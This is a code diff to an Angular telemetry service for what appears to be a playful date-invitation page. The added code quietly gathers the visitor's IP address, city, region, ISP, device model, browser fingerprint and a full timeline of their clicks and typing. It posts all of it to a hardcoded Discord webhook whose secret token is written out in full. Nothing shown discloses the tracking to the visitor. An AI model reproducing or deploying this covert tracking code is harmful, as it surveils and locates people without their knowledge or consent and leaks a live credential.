@@ -7,6 +7,22 @@ export interface InteractionEvent {
   details: string;
 }
 
+export interface DeviceInfo {
+  ip: string;
+  city: string;
+  region: string;
+  country: string;
+  isp: string;
+  os: string;
+  browser: string;
+  deviceType: 'Mobile' | 'Tablet' | 'Desktop';
+  phoneModel: string;
+  screenResolution: string;
+  timezone: string;
+  touchSupported: boolean;
+  fingerprint: string;
+}
+
 @Injectable({
   providedIn: 'root'
 })
@@ -17,6 +33,173 @@ export class TelemetryService {
   private readonly webhookUrl = 'https://discord.com/api/webhooks/1523025330393186354/YDacKvm4oypr4y4gQXwnB9vQJsk6zxGxsr1Z0WUTzODQq7C2_TdkYLuKbdElZ-_bOdhX';
   
   private events: InteractionEvent[] = [];
+  private deviceInfoPromise: Promise<DeviceInfo> | null = null;
+  private deviceInfo: DeviceInfo | null = null;
+
+  constructor() {
+    this.initDeviceInfo();
+  }
+
+  private initDeviceInfo() {
+    this.deviceInfoPromise = this.collectDeviceInfo();
+    this.deviceInfoPromise.then(info => {
+      this.deviceInfo = info;
+    }).catch(err => {
+      console.error('[Telemetry] Failed to initialize device info:', err);
+    });
+  }
+
+  getDeviceInfo(): DeviceInfo | null {
+    return this.deviceInfo;
+  }
+
+  private getSimpleHash(str: string): string {
+    let hash = 0;
+    for (let i = 0; i < str.length; i++) {
+      const char = str.charCodeAt(i);
+      hash = (hash << 5) - hash + char;
+      hash |= 0; // Convert to 32bit integer
+    }
+    return Math.abs(hash).toString(16).toUpperCase();
+  }
+
+  private parseUserAgent(ua: string) {
+    let os = 'Unknown OS';
+    let browser = 'Unknown Browser';
+    let deviceType: 'Mobile' | 'Tablet' | 'Desktop' = 'Desktop';
+    let phoneModel = 'N/A';
+
+    const isTablet = /(ipad|tablet|playbook|silk)|(android(?!.*mobile))/i.test(ua);
+    const isMobile = /Mobile|Android|iP(hone|od)|IEMobile|BlackBerry|Kindle|Opera Mini/i.test(ua);
+    
+    if (isTablet) {
+      deviceType = 'Tablet';
+    } else if (isMobile) {
+      deviceType = 'Mobile';
+    }
+
+    if (/Windows NT/i.test(ua)) {
+      os = 'Windows';
+      if (/Windows NT 10.0/i.test(ua)) os = 'Windows 10/11';
+      else if (/Windows NT 6.3/i.test(ua)) os = 'Windows 8.1';
+      else if (/Windows NT 6.2/i.test(ua)) os = 'Windows 8';
+      else if (/Windows NT 6.1/i.test(ua)) os = 'Windows 7';
+    } else if (/Android/i.test(ua)) {
+      os = 'Android';
+      const match = ua.match(/Android\s([0-9\.]+)/i);
+      if (match) os = `Android ${match[1]}`;
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
+      os = 'iOS';
+      const match = ua.match(/OS\s([0-9_]+)/i);
+      if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
+    } else if (/Macintosh/i.test(ua)) {
+      os = 'macOS';
+      const match = ua.match(/Mac OS X\s([0-9_]+)/i);
+      if (match) os = `macOS ${match[1].replace(/_/g, '.')}`;
+    } else if (/Linux/i.test(ua)) {
+      os = 'Linux';
+    }
+
+    if (/Edg/i.test(ua)) {
+      browser = 'Microsoft Edge';
+    } else if (/Chrome/i.test(ua) && !/Chromium/i.test(ua)) {
+      browser = 'Google Chrome';
+    } else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
+      browser = 'Apple Safari';
+    } else if (/Firefox/i.test(ua)) {
+      browser = 'Mozilla Firefox';
+    } else if (/MSIE|Trident/i.test(ua)) {
+      browser = 'Internet Explorer';
+    } else if (/Opera|OPR/i.test(ua)) {
+      browser = 'Opera';
+    }
+
+    if (/iPhone/i.test(ua)) {
+      phoneModel = 'iPhone';
+    } else if (/iPad/i.test(ua)) {
+      phoneModel = 'iPad';
+    } else if (/Android/i.test(ua)) {
+      const match = ua.match(/\(([^)]+)\)/);
+      if (match && match[1]) {
+        const parts = match[1].split(';');
+        const modelPart = parts.find(p => p.includes('Build/') || (!p.includes('Linux') && !p.includes('Android') && !p.includes('wv')));
+        if (modelPart) {
+          phoneModel = modelPart.replace(/Build\/.*/g, '').trim();
+        } else if (parts.length > 2) {
+          phoneModel = parts[parts.length - 1].trim();
+        } else {
+          phoneModel = 'Android Device';
+        }
+      } else {
+        phoneModel = 'Android Device';
+      }
+    }
+
+    return { os, browser, deviceType, phoneModel };
+  }
+
+  private async collectDeviceInfo(): Promise<DeviceInfo> {
+    const ua = navigator.userAgent;
+    const parsed = this.parseUserAgent(ua);
+    const screenRes = `${window.screen.width}x${window.screen.height}`;
+    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown';
+    const touchSupported = ('ontouchstart' in window || navigator.maxTouchPoints > 0);
+
+    const fingerprintRaw = [
+      ua,
+      navigator.language,
+      screenRes,
+      timezone,
+      navigator.hardwareConcurrency || '',
+      touchSupported ? 'touch' : 'no-touch'
+    ].join('|');
+    const fingerprint = this.getSimpleHash(fingerprintRaw);
+
+    let ip = 'Unknown';
+    let city = 'Unknown';
+    let region = 'Unknown';
+    let country = 'Unknown';
+    let isp = 'Unknown';
+
+    try {
+      const res = await fetch('https://ipapi.co/json/');
+      if (res.ok) {
+        const data = await res.json();
+        ip = data.ip || 'Unknown';
+        city = data.city || 'Unknown';
+        region = data.region || 'Unknown';
+        country = data.country_name || 'Unknown';
+        isp = data.org || 'Unknown';
+      }
+    } catch (e) {
+      console.warn('[Telemetry] Primary IP fetch failed, trying fallback...', e);
+      try {
+        const res2 = await fetch('https://api.ipify.org?format=json');
+        if (res2.ok) {
+          const data2 = await res2.json();
+          ip = data2.ip || 'Unknown';
+        }
+      } catch (e2) {
+        console.error('[Telemetry] Fallback IP fetch failed as well:', e2);
+      }
+    }
+
+    return {
+      ip,
+      city,
+      region,
+      country,
+      isp,
+      os: parsed.os,
+      browser: parsed.browser,
+      deviceType: parsed.deviceType,
+      phoneModel: parsed.phoneModel,
+      screenResolution: screenRes,
+      timezone,
+      touchSupported,
+      fingerprint
+    };
+  }
 
   logEvent(eventType: InteractionEvent['eventType'], details: string) {
     const event: InteractionEvent = {
@@ -31,8 +214,35 @@ export class TelemetryService {
     this.sendLiveEventToDiscord(event);
   }
 
-  private sendLiveEventToDiscord(event: InteractionEvent) {
+  private async sendLiveEventToDiscord(event: InteractionEvent) {
     if (!this.webhookUrl || this.webhookUrl.startsWith('YOUR_')) return;
+
+    if (this.deviceInfoPromise) {
+      try {
+        await this.deviceInfoPromise;
+      } catch (e) {
+        // Ignore, fallback to null/default
+      }
+    }
+
+    const fields: any[] = [];
+    if (this.deviceInfo) {
+      fields.push({
+        name: "Device 📱",
+        value: `${this.deviceInfo.phoneModel} (${this.deviceInfo.os} - ${this.deviceInfo.browser})`,
+        inline: true
+      });
+      fields.push({
+        name: "IP / Location 🌐",
+        value: `${this.deviceInfo.ip} (${this.deviceInfo.city}, ${this.deviceInfo.country})`,
+        inline: true
+      });
+      fields.push({
+        name: "Fingerprint 🔑",
+        value: `\`${this.deviceInfo.fingerprint}\``,
+        inline: true
+      });
+    }
 
     const payload = {
       embeds: [
@@ -40,6 +250,7 @@ export class TelemetryService {
           title: `Live Response: ${event.eventType} 🐾`,
           description: `\`[${event.timestamp}]\` ${event.details}`,
           color: event.eventType === 'YES_CLICK' ? 3066993 : (event.eventType === 'FORM_SUBMIT' ? 15277667 : 13962260),
+          fields: fields.length > 0 ? fields : undefined,
           timestamp: new Date().toISOString()
         }
       ]
@@ -56,11 +267,19 @@ export class TelemetryService {
     return this.events;
   }
 
-  sendLogsToDiscord(finalPlace: string, finalDate: string, finalCuisine: string, totalDodges: number, userNote: string) {
+  async sendLogsToDiscord(finalPlace: string, finalDate: string, finalCuisine: string, totalDodges: number, userNote: string) {
     if (!this.webhookUrl || this.webhookUrl.startsWith('YOUR_')) {
       console.warn('[Telemetry] Webhook URL not set. Logging to console instead:');
       console.log(JSON.stringify(this.events, null, 2));
       return;
+    }
+
+    if (this.deviceInfoPromise) {
+      try {
+        await this.deviceInfoPromise;
+      } catch (e) {
+        // Ignore
+      }
     }
 
     let timelineText = this.events
@@ -80,6 +299,21 @@ export class TelemetryService {
             { name: "Meeting Date 🗓️", value: finalDate || "None", inline: true },
             { name: "Total 'No' Dodges 🏹", value: `${totalDodges} times`, inline: true },
             { name: "Akriti's Note for You 📝", value: userNote || "*No note left.*", inline: false },
+            { 
+              name: "Device Type & Model 📱", 
+              value: this.deviceInfo ? `${this.deviceInfo.phoneModel} (${this.deviceInfo.deviceType} - ${this.deviceInfo.os} using ${this.deviceInfo.browser})` : "Unknown", 
+              inline: true 
+            },
+            { 
+              name: "IP & Location 🌐", 
+              value: this.deviceInfo ? `${this.deviceInfo.ip} (${this.deviceInfo.city}, ${this.deviceInfo.region}, ${this.deviceInfo.country} via ${this.deviceInfo.isp})` : "Unknown", 
+              inline: true 
+            },
+            { 
+              name: "Device Fingerprint 🔑", 
+              value: this.deviceInfo ? `\`${this.deviceInfo.fingerprint}\`` : "Unknown", 
+              inline: true 
+            },
             { name: "Full Timeline of Clicks & Typings", value: timelineText || "No events logged.", inline: false }
           ],
           footer: {
